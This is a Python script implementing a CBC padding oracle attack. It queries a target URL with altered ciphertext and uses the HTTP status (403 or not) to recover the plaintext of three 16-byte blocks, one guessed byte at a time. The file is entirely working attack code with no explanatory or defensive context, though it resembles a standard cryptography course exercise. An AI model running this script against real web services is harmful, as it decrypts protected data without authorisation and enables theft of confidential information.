import urllib3 as ul

BLOCKSIZE = 16

AZ = [i for i in range(ord('A'), ord('Z') + 1)]
space = [ord(' ')]
az = [i for i in range(ord('a'),ord('z') +1)]
paddings = [i for i in range(1, 17)]

misc1 = [i for i in range(17, 32)] + [i for i in range(33, 65)]
misc2 = [i for i in range(91, 97)] + [i for i in range(123, 128)]

ALL = paddings + space + az  + AZ + misc1 + misc2


def xor(x, y, z):
    assert len(x) == len(y) == len(z)
    a = int.from_bytes(x, "big")
    b = int.from_bytes(y, "big")
    c = int.from_bytes(z, "big")
    r = a ^ b ^ c
    return r.to_bytes(len(x), "big")


def decode(m):
    pad = m[-1]
    assert 1 <= pad <= 16, "Wrong padding"

    for i in range(1, pad + 1):
        assert m[-i] == pad, "Wrong padding"

    return m[:-pad].decode("utf-8")


class PaddingOracle:
    def __init__(self, target):
        self.target = target
        self.http = ul.PoolManager()

    # ct: string representing hex encoded: 128 characters
    # 1 block IV + 3 blocks ciphertext
    # 16 bytes per block
    def decrypt4blocks(self, ct, debug=True):

        assert len(ct) == 128
        assert self.status_query(ct) == 200

        iv, c0, c1, c2 = ct[:32], ct[32:64], ct[64:96], ct[96:]

        m0 = self.decrypt_block(c0, iv)
        print(" --> First block:  ", m0)

        m1 = self.decrypt_block(c1, c0)
        print(" --> Second block: ",  m1)

        m2 = self.decrypt_block(c2, c1)
        print(" --> Third block: ", m2)

        return m0 + m1 + m2

    def decrypt_block(self, c, c0_hex):
        m = bytearray(BLOCKSIZE)
        c0 = bytes.fromhex(c0_hex)

        for i in range(1, BLOCKSIZE + 1):
            self.overwrite_and_send_byte(m, c, i, c0)
        return m

    # Overwrites one byte in message m for each iteration
    def overwrite_and_send_byte(self, m, c, i, c0):

        n = bytes([i for _ in range(BLOCKSIZE)])
        CURRENT = BLOCKSIZE - i

        for g in ALL:

            m[CURRENT] = g
            q = xor(n, m, c0).hex() + c

            if self.is_valid(q) is True:
                print(chr(g), end="_")
                return

        raise ValueError("Unable to find byte")

    def is_valid(self, q):
        r = self.http.request('GET', self.target + q, retries=False)
        return r.status != 403

    def status_query(self, q):
        return self.http.request('GET', self.target + q, retries=False).status

